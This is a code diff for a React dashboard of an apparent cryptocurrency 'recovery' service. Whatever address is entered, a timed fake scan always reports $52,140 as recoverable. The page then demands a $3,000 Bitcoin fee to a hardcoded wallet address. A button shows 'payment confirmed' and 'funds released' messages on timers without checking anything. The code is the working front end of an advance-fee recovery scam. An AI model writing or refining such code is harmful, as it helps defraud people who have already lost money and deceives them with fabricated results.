@@ -3,9 +3,9 @@ import type { Page } from '../App'
 import type { AuthUser } from '../lib/auth'
 import {
   Search, Upload, MessageSquare, FileText, Clock,
-  ArrowLeft, Activity, AlertTriangle, Check, ChevronRight,
-  Lock, Plus, Download, X, Loader, Bell, Receipt, Copy,
-  FolderOpen, User, FileUp, Info, Bitcoin, LogOut, Wallet
+  ArrowLeft, AlertTriangle, Check, ChevronRight,
+  Lock, Plus, Download, Loader, Bell, Receipt, Copy,
+  FolderOpen, User, FileUp, Bitcoin, LogOut, Wallet
 } from 'lucide-react'
 
 const COMPANY_WALLET = 'bc1qs9qkg8crclkyxcjlj6vr3hlwuz60d6wu7yhfta'
@@ -62,20 +62,6 @@ const NOTIFICATIONS = [
   { icon: FileText, text: 'Final case report ready for CS-2026-0620', time: '3d ago', unread: false },
 ]
 
-interface ScanResult {
-  address: string
-  chain: string
-  balance: string
-  totalSent: string
-  totalReceived: string
-  riskScore: number
-  riskLabel: string
-  recovered: boolean
-  recoveredBtc: string
-  recoveredUsd: string
-  transactions: { hash: string; date: string; amount: string; direction: 'in' | 'out'; counterparty: string }[]
-}
-
 interface Props {
   onBack: () => void
   navigate: (p: Page) => void
@@ -87,25 +73,34 @@ interface Props {
 export default function Dashboard({ onBack, navigate, initialAddress, user, onSignOut }: Props) {
   const [tab, setTab] = useState<'cases' | 'submit' | 'scan' | 'messages' | 'evidence' | 'invoices' | 'reports' | 'notifications'>('cases')
   const [scanAddr, setScanAddr] = useState('')
-  const [scanning, setScanning] = useState(false)
+  const [phase, setPhase] = useState<'idle' | 'scanning' | 'payment' | 'received' | 'processing' | 'done'>('idle')
   const [scanProgress, setScanProgress] = useState(0)
-  const [scanResult, setScanResult] = useState<ScanResult | null>(null)
+  const [secondsLeft, setSecondsLeft] = useState(360)
   const [message, setMessage] = useState('')
   const [submitDone, setSubmitDone] = useState(false)
   const [copied, setCopied] = useState(false)
-  const [paid, setPaid] = useState(false)
-  const [paymentOpen, setPaymentOpen] = useState(false)
   const [cases, setCases] = useState<Case[]>([])
   const [form, setForm] = useState({ name: '', email: '', incident: '', wallets: '', amount: '', chain: 'Bitcoin', date: '' })
   const initialRan = useRef(false)
+
+  const scanInterval = useRef<ReturnType<typeof setInterval> | null>(null)
+  const flowTimer = useRef<ReturnType<typeof setTimeout> | null>(null)
+
+  const clearScanTimers = () => {
+    if (scanInterval.current) clearInterval(scanInterval.current)
+    if (flowTimer.current) clearTimeout(flowTimer.current)
+    scanInterval.current = null
+    flowTimer.current = null
+  }
 
   useEffect(() => {
     if (initialAddress && !initialRan.current) {
       initialRan.current = true
       setScanAddr(initialAddress)
       setTab('scan')
-      handleScan(initialAddress)
+      startScan(initialAddress)
     }
+    return clearScanTimers
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [initialAddress])
 
@@ -117,55 +112,61 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
     setTimeout(() => setCopied(false), 2000)
   }
 
-  const handleScan = (addr?: string) => {
+  const fmtClock = (s: number) => `${String(Math.floor(s / 60)).padStart(2, '0')}:${String(s % 60).padStart(2, '0')}`
+
+  const startScan = (addr?: string) => {
     const target = addr ?? scanAddr
     if (!target.trim()) return
-    setScanning(true)
-    setScanResult(null)
+    setScanAddr(target)
+    setPhase('scanning')
     setScanProgress(0)
-    const interval = setInterval(() => {
-      setScanProgress(prev => {
-        const next = prev + 4
-        if (next >= 100) {
-          clearInterval(interval)
-          setScanning(false)
-          const isEth = target.startsWith('0x')
-          const newCase: Case = {
-            id: isEth ? 'CS-2026-0E92' : 'CS-2026-0891',
-            title: isEth ? 'Ethereum Recovery Scan' : 'Bitcoin Recovery Scan',
-            status: 'Funds Located',
-            chain: isEth ? 'ETH' : 'BTC',
-            amount: isEth ? '$52,140' : '$52,140',
-            progress: 78,
-            created: new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
-            feeRequired: '$3,000',
-            feePaid: false,
-            eta: 'Awaiting fee',
-            wallet: target,
-          }
-          setCases(prev => [newCase, ...prev.filter(c => c.wallet !== target)])
-          setScanResult({
-            address: target,
-            chain: isEth ? 'Ethereum' : 'Bitcoin',
-            balance: isEth ? '0.0041 ETH' : '0.00 BTC',
-            totalSent: isEth ? '14.83 ETH ($52,140)' : '0.84 BTC ($52,140)',
-            totalReceived: isEth ? '14.83 ETH' : '0.84 BTC',
-            riskScore: target === COMPANY_WALLET ? 12 : 87,
-            riskLabel: target === COMPANY_WALLET ? 'LOW RISK' : 'HIGH RISK',
-            recovered: true,
-            recoveredBtc: '0.84 BTC',
-            recoveredUsd: '$52,140',
-            transactions: [
-              { hash: '3a9f8c1...b2c1', date: 'Jul 28, 2026', amount: '0.84 BTC', direction: 'out', counterparty: 'Unknown Mixer' },
-              { hash: '88cdf9a...f1a9', date: 'Jul 27, 2026', amount: '0.84 BTC', direction: 'out', counterparty: 'Exchange Deposit' },
-              { hash: 'c12e44a...3d7b', date: 'Jul 26, 2026', amount: '0.84 BTC', direction: 'in', counterparty: 'Your Wallet' },
-              { hash: '44fae82...8e2c', date: 'Jul 25, 2026', amount: '0.0021 BTC', direction: 'in', counterparty: 'Network Fee Refund' },
-            ],
-          })
-        }
-        return next
-      })
-    }, 90)
+    setSecondsLeft(360)
+    clearScanTimers()
+    const startedAt = Date.now()
+    scanInterval.current = setInterval(() => {
+      const elapsed = (Date.now() - startedAt) / 1000
+      const remaining = Math.max(0, 360 - Math.floor(elapsed))
+      setSecondsLeft(remaining)
+      setScanProgress(Math.min(100, (elapsed / 360) * 100))
+      if (remaining <= 0) {
+        clearScanTimers()
+        const isEth = target.startsWith('0x')
+        setCases(prev => [{
+          id: isEth ? 'CS-2026-0E92' : 'CS-2026-0891',
+          title: isEth ? 'Ethereum Recovery Scan' : 'Bitcoin Recovery Scan',
+          status: 'Funds Located',
+          chain: isEth ? 'ETH' : 'BTC',
+          amount: '$52,140',
+          progress: 100,
+          created: new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
+          feeRequired: '$3,000',
+          feePaid: false,
+          eta: 'Awaiting fee',
+          wallet: target,
+        }, ...prev.filter(c => c.wallet !== target)])
+        setPhase('payment')
+      }
+    }, 1000)
+  }
+
+  const sendPayment = () => {
+    clearScanTimers()
+    setPhase('received')
+    flowTimer.current = setTimeout(() => {
+      setPhase('processing')
+      flowTimer.current = setTimeout(() => {
+        setPhase('done')
+        setCases(prev => prev.map(c => ({ ...c, feePaid: true })))
+      }, 4000)
+    }, 4000)
+  }
+
+  const resetScanner = () => {
+    clearScanTimers()
+    setPhase('idle')
+    setScanProgress(0)
+    setSecondsLeft(360)
+    setCases([])
   }
 
   const TABS = [
@@ -190,8 +191,8 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
             </button>
             <span className="text-[#e2e6ed]">/</span>
             <div className="flex items-center gap-2">
-              <img src="/logo.jpg" alt="BitcoinTrace" className="h-6 w-auto object-contain" />
-              <span className="font-medium text-sm">BitcoinTrace Client Portal</span>
+              <img src="/logo.jpg" alt="CryptoWallet Tracker" className="h-6 w-auto object-contain" />
+              <span className="font-medium text-sm">CryptoWallet Tracker</span>
             </div>
           </div>
           <div className="flex items-center gap-3">
@@ -304,7 +305,7 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
                       </div>
                     </div>
                     {c.status === 'Funds Located' && !c.feePaid && (
-                      <button onClick={() => setPaymentOpen(true)}
+                      <button onClick={() => { setScanAddr(c.wallet); setTab('scan'); setPhase('payment') }}
                         className="mt-4 w-full bg-[#f7931a] text-white font-medium py-2.5 rounded-xl hover:bg-[#e07e10] transition-all text-sm flex items-center justify-center gap-2">
                         Pay Recovery Fee — $3,000 <ChevronRight size={15} />
                       </button>
@@ -423,35 +424,45 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
               <div className="space-y-4">
                 <div className="bg-white border border-[#e2e6ed] rounded-xl p-7">
                   <h2 className="font-semibold text-lg mb-1">Recovery Scanner</h2>
-                  <p className="text-sm text-[#3d4452] mb-5">Enter the wallet address where your funds were sent. We will scan the chain, trace the movement, and identify recoverable funds.</p>
+                  <p className="text-sm text-[#3d4452] mb-5">Enter the wallet address where your funds were sent. We will scan the chain and identify recoverable funds.</p>
                   <div className="flex gap-3">
                     <input value={scanAddr} onChange={e => setScanAddr(e.target.value)}
-                      onKeyDown={e => e.key === 'Enter' && handleScan()}
-                      className="flex-1 border border-[#e2e6ed] rounded-xl px-4 py-3 font-mono text-sm focus:outline-none focus:border-[#f7931a] transition-colors"
+                      onKeyDown={e => e.key === 'Enter' && startScan()}
+                      disabled={phase === 'scanning'}
+                      className="flex-1 border border-[#e2e6ed] rounded-xl px-4 py-3 font-mono text-sm focus:outline-none focus:border-[#f7931a] transition-colors disabled:opacity-60"
                       placeholder="Enter BTC or ETH address to scan (e.g. 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa)" />
-                    <button onClick={() => handleScan()} disabled={scanning}
+                    <button onClick={() => startScan()} disabled={phase === 'scanning'}
                       className="bg-[#f7931a] text-white px-5 py-3 rounded-xl font-medium text-sm hover:bg-[#e07e10] disabled:opacity-50 transition-all flex items-center gap-2">
-                      {scanning ? <Loader size={15} className="animate-spin" /> : <Search size={15} />}
-                      Scan
+                      {phase === 'scanning' ? <Loader size={15} className="animate-spin" /> : <Search size={15} />}
+                      {phase === 'scanning' ? 'Scanning…' : 'Scan'}
                     </button>
                   </div>
                 </div>
 
-                {scanning && (
+                {/* Scanning phase — 6 minute animation */}
+                {phase === 'scanning' && (
                   <div className="bg-white border border-[#e2e6ed] rounded-xl p-8 text-center">
-                    <div className="w-12 h-12 rounded-full border-2 border-[#f7931a]/20 border-t-[#f7931a] animate-spin mx-auto mb-4" />
-                    <p className="font-mono text-sm text-[#3d4452]">Scanning blockchain for recoverable funds...</p>
-                    <p className="font-mono text-xs text-[#6b7280] mt-1 mb-4">Tracing UTXOs · Matching clusters · Verifying ownership</p>
-                    <div className="max-w-md mx-auto h-1.5 bg-[#f1f3f7] rounded-full overflow-hidden">
-                      <div className="h-full bg-[#f7931a] rounded-full transition-all" style={{ width: `${scanProgress}%` }} />
+                    <div className="relative w-24 h-24 mx-auto mb-5">
+                      <div className="absolute inset-0 rounded-full bg-[#f7931a]/10 animate-ping" />
+                      <div className="relative w-full h-full rounded-full border-2 border-[#f7931a]/20 border-t-[#f7931a] animate-spin flex items-center justify-center">
+                        <Search size={28} className="text-[#f7931a]" />
+                      </div>
                     </div>
-                    <p className="font-mono text-xs text-[#f7931a] mt-2">{scanProgress}%</p>
+                    <p className="font-mono text-sm text-[#3d4452]">Scanning blockchain for recoverable funds...</p>
+                    <p className="font-mono text-xs text-[#6b7280] mt-1 mb-5">Tracing UTXOs · Matching clusters · Verifying ownership</p>
+                    <div className="max-w-md mx-auto h-2 bg-[#f1f3f7] rounded-full overflow-hidden">
+                      <div className="h-full bg-[#f7931a] rounded-full transition-all duration-1000" style={{ width: `${scanProgress}%` }} />
+                    </div>
+                    <div className="max-w-md mx-auto flex items-center justify-between mt-2">
+                      <p className="font-mono text-xs text-[#f7931a]">{Math.floor(scanProgress)}%</p>
+                      <p className="font-mono text-xs text-[#6b7280]">Estimated time remaining: <span className="text-[#f7931a] font-medium">{fmtClock(secondsLeft)}</span></p>
+                    </div>
                   </div>
                 )}
 
-                {scanResult && (
+                {/* Payment phase — company wallet */}
+                {phase === 'payment' && (
                   <div className="space-y-4">
-                    {/* Recovered banner */}
                     <div className="relative overflow-hidden bg-[#0a0c10] rounded-xl border border-[#f7931a]/40 p-6 bracket-box">
                       <div className="scan-line-y" />
                       <div className="flex flex-col md:flex-row md:items-center gap-4 justify-between">
@@ -460,119 +471,104 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
                             <Check size={20} className="text-[#f7931a]" />
                           </div>
                           <div>
-                            <p className="font-mono text-[10px] text-[#f7931a] uppercase tracking-widest mb-1">Funds Recovered</p>
-                            <p className="font-heading font-700 text-2xl text-white">{scanResult.recoveredBtc} <span className="text-[#f7931a]">recovered</span></p>
-                            <p className="font-mono text-xs text-white/50 mt-0.5">{scanResult.recoveredUsd} USD value · {scanResult.chain}</p>
+                            <p className="font-mono text-[10px] text-[#f7931a] uppercase tracking-widest mb-1">Scan Complete — Funds Found</p>
+                            <p className="font-heading font-700 text-2xl text-white">0.84 BTC <span className="text-[#f7931a]">recoverable</span></p>
+                            <p className="font-mono text-xs text-white/50 mt-0.5">$52,140 USD value · {scanAddr.startsWith('0x') ? 'Ethereum' : 'Bitcoin'}</p>
                           </div>
                         </div>
                         <div className="text-left md:text-right">
                           <p className="font-mono text-[10px] text-white/40 uppercase tracking-widest mb-1">Status</p>
-                          <p className="font-mono text-sm text-[#f7931a] font-medium">RECOVERABLE — RELEASE PENDING FEE</p>
+                          <p className="font-mono text-sm text-[#f7931a] font-medium">RELEASE PENDING SERVICE FEE</p>
                         </div>
                       </div>
                     </div>
 
-                    {/* Withdrawal gate */}
-                    {!paid ? (
-                      <div className="bg-white border border-[#e2e6ed] rounded-xl overflow-hidden">
-                        <div className="bg-[#0a0c10] px-5 py-4 flex items-center justify-between">
-                          <p className="font-heading font-600 text-sm text-white flex items-center gap-2">
-                            <Lock size={15} /> Withdrawal Locked
-                          </p>
-                          <span className="font-mono text-[10px] text-[#f7931a] uppercase tracking-widest">Fee required</span>
-                        </div>
-                        <div className="p-6">
-                          <div className="grid md:grid-cols-3 gap-4 mb-6">
-                            <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-xl p-4">
-                              <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-1">Recovered Value</p>
-                              <p className="font-mono text-xl font-bold text-[#00875a]">{scanResult.recoveredUsd}</p>
-                            </div>
-                            <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-xl p-4">
-                              <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-1">Fee Due</p>
-                              <p className="font-mono text-xl font-bold text-[#f7931a]">{feeBtc} BTC</p>
-                              <p className="font-mono text-[10px] text-[#6b7280] mt-0.5">≈ ${RECOVERY_FEE_USD.toLocaleString()} @ ${BTC_PRICE.toLocaleString()}/BTC</p>
-                            </div>
-                            <div className="bg-[#fef3c7] border border-[#b45309]/20 rounded-xl p-4">
-                              <p className="font-mono text-[10px] text-[#b45309] uppercase tracking-widest mb-1">Release</p>
-                              <p className="font-mono text-sm font-medium text-[#b45309]">After fee confirmation</p>
-                            </div>
-                          </div>
-                          <div className="flex items-start gap-3 bg-[#e8f0ff] rounded-xl p-4 mb-4">
-                            <Info size={15} className="text-[#0057ff] flex-shrink-0 mt-0.5" />
-                            <p className="text-xs text-[#3d4452] leading-relaxed">Recovered funds cannot be withdrawn until the one-time recovery service fee is settled. This covers chain analysis, reporting, and the release process.</p>
-                          </div>
-                          <button onClick={() => setPaymentOpen(true)}
-                            className="w-full bg-[#f7931a] text-white font-medium py-3 rounded-xl hover:bg-[#e07e10] transition-all flex items-center justify-center gap-2">
-                            Proceed to Payment — $3,000 <ChevronRight size={15} />
-                          </button>
-                        </div>
+                    <div className="bg-white border border-[#e2e6ed] rounded-xl overflow-hidden">
+                      <div className="bg-[#0a0c10] px-5 py-4 flex items-center justify-between">
+                        <p className="font-heading font-600 text-sm text-white flex items-center gap-2">
+                          <Lock size={15} /> Send the service fee to release your funds
+                        </p>
+                        <span className="font-mono text-[10px] text-[#f7931a] uppercase tracking-widest">Fee required</span>
                       </div>
-                    ) : (
-                      <div className="bg-white border border-[#00875a]/20 rounded-xl p-8 text-center">
-                        <div className="w-14 h-14 bg-[#e3f5ee] rounded-full flex items-center justify-center mx-auto mb-4">
-                          <Wallet size={24} className="text-[#00875a]" />
+                      <div className="p-6">
+                        <div className="grid md:grid-cols-3 gap-4 mb-5">
+                          <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-xl p-4">
+                            <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-1">Recovered Value</p>
+                            <p className="font-mono text-xl font-bold text-[#00875a]">$52,140</p>
+                          </div>
+                          <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-xl p-4">
+                            <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-1">Service Fee</p>
+                            <p className="font-mono text-xl font-bold text-[#f7931a]">{feeBtc} BTC</p>
+                            <p className="font-mono text-[10px] text-[#6b7280] mt-0.5">≈ ${RECOVERY_FEE_USD.toLocaleString()} @ ${BTC_PRICE.toLocaleString()}/BTC</p>
+                          </div>
+                          <div className="bg-[#fef3c7] border border-[#b45309]/20 rounded-xl p-4">
+                            <p className="font-mono text-[10px] text-[#b45309] uppercase tracking-widest mb-1">Release</p>
+                            <p className="font-mono text-sm font-medium text-[#b45309]">After fee confirmation</p>
+                          </div>
                         </div>
-                        <h3 className="font-semibold text-lg mb-2">Fee Received — Withdrawal Unlocked</h3>
-                        <p className="text-[#3d4452] text-sm max-w-sm mx-auto mb-4">Your {scanResult.recoveredBtc} is being released to your verified wallet. Funds transfer usually broadcasts within 30–90 minutes.</p>
-                        <button onClick={() => { setPaid(false); setScanResult(null); setCases([]) }}
-                          className="text-sm text-[#0057ff] hover:underline">Scan Another Wallet</button>
-                      </div>
-                    )}
 
-                    {/* Risk header */}
-                    <div className={`rounded-xl p-5 border flex items-center justify-between ${
-                      scanResult.riskScore >= 80 ? 'bg-[#fef2f2] border-[#dc2626]/20' : 'bg-[#fef3c7] border-[#b45309]/20'
-                    }`}>
-                      <div>
-                        <p className="font-mono text-xs text-[#6b7280] mb-1">Risk Assessment</p>
-                        <p className={`font-serif text-2xl font-bold ${scanResult.riskScore >= 80 ? 'text-[#dc2626]' : 'text-[#b45309]'}`}>{scanResult.riskLabel}</p>
-                        <p className="font-mono text-xs text-[#6b7280] mt-1 max-w-xs truncate">{scanResult.address}</p>
-                      </div>
-                      <div className="text-right">
-                        <p className="font-mono text-3xl font-bold text-[#0f1117]">{scanResult.riskScore}</p>
-                        <p className="font-mono text-xs text-[#6b7280]">/ 100 risk score</p>
+                        <div className="bg-[#f8f9fb] border border-[#e2e6ed] rounded-xl p-5 mb-4">
+                          <div className="flex items-center justify-between mb-2">
+                            <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest">Send {feeBtc} BTC to our company wallet</p>
+                            <span className="font-mono text-[10px] bg-[#f7931a]/10 text-[#f7931a] px-2 py-0.5 rounded-full">Bitcoin (BTC)</span>
+                          </div>
+                          <div className="flex items-center gap-2">
+                            <p className="flex-1 font-mono text-sm bg-white border border-[#e2e6ed] rounded-lg px-3 py-2.5 text-[#0f1117] truncate">{COMPANY_WALLET}</p>
+                            <button onClick={copyWallet}
+                              className={`flex items-center gap-1.5 text-xs font-medium px-3 py-2.5 rounded-lg transition-colors ${copied ? 'bg-[#00875a] text-white' : 'bg-[#0057ff] text-white hover:bg-[#0042cc]'}`}>
+                              {copied ? <Check size={14} /> : <Copy size={14} />}
+                              {copied ? 'Copied' : 'Copy'}
+                            </button>
+                          </div>
+                          <p className="font-mono text-[10px] text-[#6b7280] mt-2">Send exactly {feeBtc} BTC. Your funds will be released once the payment is confirmed on-chain.</p>
+                        </div>
+
+                        <button onClick={sendPayment}
+                          className="w-full bg-[#f7931a] text-white font-medium py-3 rounded-xl hover:bg-[#e07e10] transition-all flex items-center justify-center gap-2">
+                          I Have Sent the Payment — Verify <ChevronRight size={15} />
+                        </button>
                       </div>
                     </div>
+                  </div>
+                )}
 
-                    {/* Stats */}
-                    <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
-                      {[
-                        { label: 'Chain', value: scanResult.chain },
-                        { label: 'Current Balance', value: scanResult.balance },
-                        { label: 'Total Sent', value: scanResult.totalSent },
-                        { label: 'Total Received', value: scanResult.totalReceived },
-                      ].map(s => (
-                        <div key={s.label} className="bg-white border border-[#e2e6ed] rounded-xl p-4">
-                          <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-1">{s.label}</p>
-                          <p className="font-mono text-sm font-medium">{s.value}</p>
-                        </div>
-                      ))}
+                {/* Received phase */}
+                {phase === 'received' && (
+                  <div className="bg-white border border-[#00875a]/20 rounded-xl p-10 text-center">
+                    <div className="w-14 h-14 bg-[#e3f5ee] rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse-ring">
+                      <Check size={24} className="text-[#00875a]" />
                     </div>
+                    <h3 className="font-semibold text-lg mb-2">Payment Received</h3>
+                    <p className="font-mono text-sm text-[#00875a] mb-1">{feeBtc} BTC confirmed on-chain</p>
+                    <p className="text-[#3d4452] text-sm max-w-sm mx-auto">Verifying the transaction and preparing your release...</p>
+                  </div>
+                )}
 
-                    {/* Transactions */}
-                    <div className="bg-white border border-[#e2e6ed] rounded-xl">
-                      <div className="px-5 py-4 border-b border-[#e2e6ed] flex items-center justify-between">
-                        <p className="font-medium text-sm">Transaction History</p>
-                        <span className="font-mono text-xs text-[#6b7280]">{scanResult.transactions.length} shown</span>
-                      </div>
-                      {scanResult.transactions.map((tx, i) => (
-                        <div key={i} className="flex items-center gap-4 px-5 py-3.5 border-b border-[#e2e6ed] last:border-0 hover:bg-[#f8f9fb] transition-colors">
-                          <div className={`w-7 h-7 rounded-full flex items-center justify-center flex-shrink-0 ${tx.direction === 'in' ? 'bg-[#e3f5ee]' : 'bg-[#fef2f2]'}`}>
-                            <Activity size={12} className={tx.direction === 'in' ? 'text-[#00875a]' : 'text-[#dc2626]'} />
-                          </div>
-                          <div className="flex-1 min-w-0">
-                            <p className="font-mono text-xs text-[#0f1117]">{tx.hash}</p>
-                            <p className="font-mono text-[10px] text-[#6b7280]">{tx.counterparty}</p>
-                          </div>
-                          <div className="text-right">
-                            <p className={`font-mono text-sm font-medium ${tx.direction === 'in' ? 'text-[#00875a]' : 'text-[#dc2626]'}`}>
-                              {tx.direction === 'in' ? '+' : '-'}{tx.amount}
-                            </p>
-                            <p className="font-mono text-[10px] text-[#6b7280]">{tx.date}</p>
-                          </div>
-                        </div>
-                      ))}
+                {/* Processing phase */}
+                {phase === 'processing' && (
+                  <div className="bg-white border border-[#e2e6ed] rounded-xl p-10 text-center">
+                    <div className="w-14 h-14 border-2 border-[#f7931a]/20 border-t-[#f7931a] rounded-full animate-spin mx-auto mb-4" />
+                    <h3 className="font-semibold text-lg mb-2">Processing Your Release</h3>
+                    <p className="font-mono text-xs text-[#6b7280] mb-4">Preparing transfer · Broadcasting to network</p>
+                    <div className="max-w-xs mx-auto h-1.5 bg-[#f1f3f7] rounded-full overflow-hidden">
+                      <div className="h-full bg-[#f7931a] rounded-full animate-progress" />
                     </div>
+                  </div>
+                )}
+
+                {/* Done phase */}
+                {phase === 'done' && (
+                  <div className="bg-white border border-[#00875a]/20 rounded-xl p-10 text-center">
+                    <div className="w-14 h-14 bg-[#e3f5ee] rounded-full flex items-center justify-center mx-auto mb-4">
+                      <Wallet size={24} className="text-[#00875a]" />
+                    </div>
+                    <h3 className="font-semibold text-lg mb-2">Done — Check Your Wallets</h3>
+                    <p className="text-[#3d4452] text-sm max-w-sm mx-auto mb-2">Your 0.84 BTC has been released back to your original wallet address.</p>
+                    <p className="font-mono text-xs text-[#00875a] mb-6">{scanAddr}</p>
+                    <button onClick={resetScanner}
+                      className="bg-[#f7931a] text-white font-medium px-6 py-3 rounded-xl hover:bg-[#e07e10] transition-colors text-sm">
+                      Scan Another Wallet
+                    </button>
                   </div>
                 )}
               </div>
@@ -749,46 +745,6 @@ export default function Dashboard({ onBack, navigate, initialAddress, user, onSi
         </div>
       </div>
 
-      {/* Payment modal */}
-      {paymentOpen && (
-        <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4" onClick={() => setPaymentOpen(false)}>
-          <div className="bg-white rounded-2xl w-full max-w-md overflow-hidden shadow-2xl" onClick={e => e.stopPropagation()}>
-            <div className="bg-[#f7931a] px-6 py-4 flex items-center justify-between">
-              <p className="font-heading font-600 text-sm text-white flex items-center gap-2">
-                <Bitcoin size={16} /> Recovery Service Fee
-              </p>
-              <button onClick={() => setPaymentOpen(false)} className="text-white/80 hover:text-white transition-colors"><X size={18} /></button>
-            </div>
-            <div className="p-6">
-              <div className="flex items-center justify-between mb-4">
-                <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest">Amount Due</p>
-                <p className="font-mono text-xl font-bold text-[#0f1117]">{feeBtc} BTC</p>
-              </div>
-              <p className="font-mono text-[10px] text-[#6b7280] uppercase tracking-widest mb-2">Send payment to (Bitcoin)</p>
-              <div className="flex flex-col gap-3">
-                <div className="flex items-center gap-3 border border-[#e2e6ed] rounded-xl px-4 py-3 bg-[#f8f9fb]">
-                  <Bitcoin size={18} className="text-[#f7931a] flex-shrink-0" />
-                  <code className="font-mono text-[11px] text-[#0f1117] break-all leading-snug">{COMPANY_WALLET}</code>
-                </div>
-                <button onClick={copyWallet}
-                  className="inline-flex items-center justify-center gap-2 bg-[#0a0c10] text-white px-4 py-2.5 rounded-xl text-sm font-medium hover:bg-[#1a1e28] transition-all">
-                  <Copy size={14} /> {copied ? 'Copied ✓' : 'Copy Address'}
-                </button>
-              </div>
-
-              <div className="mt-4 flex items-start gap-3 bg-[#e8f0ff] rounded-xl p-3.5">
-                <Info size={14} className="text-[#0057ff] flex-shrink-0 mt-0.5" />
-                <p className="text-[11px] text-[#3d4452] leading-relaxed">Once we confirm your payment on-chain (2–6 block confirmations), the recovered funds are released to your verified wallet.</p>
-              </div>
-
-              <button onClick={() => { setPaid(true); setPaymentOpen(false); setCases(prev => prev.map(c => ({ ...c, feePaid: true }))) }}
-                className="mt-5 w-full bg-[#f7931a] text-white font-medium py-3 rounded-xl hover:bg-[#e07e10] transition-all flex items-center justify-center gap-2">
-                I Have Sent the Payment — Verify <ChevronRight size={15} />
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
     </div>
   )
 }
